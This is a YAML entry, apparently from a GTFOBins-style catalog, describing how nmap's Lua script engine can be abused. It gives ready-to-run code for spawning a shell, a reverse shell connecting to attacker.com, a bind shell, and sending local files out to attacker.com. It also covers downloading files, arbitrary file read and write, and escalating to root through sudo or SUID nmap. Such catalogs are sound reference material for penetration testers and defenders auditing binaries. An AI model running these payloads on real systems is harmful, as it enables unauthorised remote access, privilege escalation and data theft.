---
functions:
  shell:
    - description: Input echo is disabled.
      code: |
        TF=$(mktemp)
        echo 'os.execute("/bin/sh")' > $TF
        nmap --script=$TF
  non-interactive-reverse-shell:
    - description: Run ``nc -l -p 12345`` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        TF=$(mktemp)
        echo 'local s=require("socket");
          local t=assert(s.tcp());
          t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
          while true do
            local r,x=t:receive();local f=assert(io.popen(r,"r"));
            local b=assert(f:read("*a"));t:send(b);
          end;
          f:close();t:close();' > $TF
        nmap --script=$TF
  non-interactive-bind-shell:
    - description: Run `nc target.com 12345` on the attacker box to connect to the shell.
      code: |
        export LPORT=12345
        TF=$(mktemp)
        echo 'local k=require("socket");
          local s=assert(k.bind("*",os.getenv("LPORT")));
          local c=s:accept();
          while true do
            local r,x=c:receive();local f=assert(io.popen(r,"r"));
            local b=assert(f:read("*a"));c:send(b);
          end;c:close();f:close();' > $TF
        nmap --script=$TF
  file-upload:
    - description: Send a file to a TCP port. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        export LFILE=file_to_send
        TF=$(mktemp)
        echo 'local f=io.open(os.getenv("LFILE"), 'rb')
          local d=f:read("*a")
          io.close(f);
          local s=require("socket");
          local t=assert(s.tcp());
          t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
          t:send(d);
          t:close();' > $TF
        nmap --script=$TF
  file-download:
    - description: Fetch remote file sent to a local TCP port. Run `nc target.com 12345
        < "file_to_send"` on the attacker box to send the file.
      code: |
        export LPORT=12345
        export LFILE=file_to_save
        TF=$(mktemp)
        echo 'local k=require("socket");
          local s=assert(k.bind("*",os.getenv("LPORT")));
          local c=s:accept();
          local d,x=c:receive("*a");
          c:close();
          local f=io.open(os.getenv("LFILE"), "wb");
          f:write(d);
          io.close(f);' > $TF
        nmap --script=$TF
  file-write:
    - code: |
        TF=$(mktemp)
        echo 'lua -e 'local f=io.open("file_to_write", "wb"); f:write("data"); io.close(f);' > $TF
        nmap --script=$TF
  file-read:
    - code: |
        TF=$(mktemp)
        echo 'lua -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);' > $TF
        nmap --script=$TF
  sudo:
    - description: Input echo is disabled.
      code: |
        TF=$(mktemp)
        echo 'os.execute("/bin/sh")' > $TF
        sudo nmap --script=$TF
  limited-suid:
    - description: Input echo is disabled.
      code: |
        TF=$(mktemp)
        echo 'os.execute("/bin/sh")' > $TF
        ./nmap --script=$TF
---
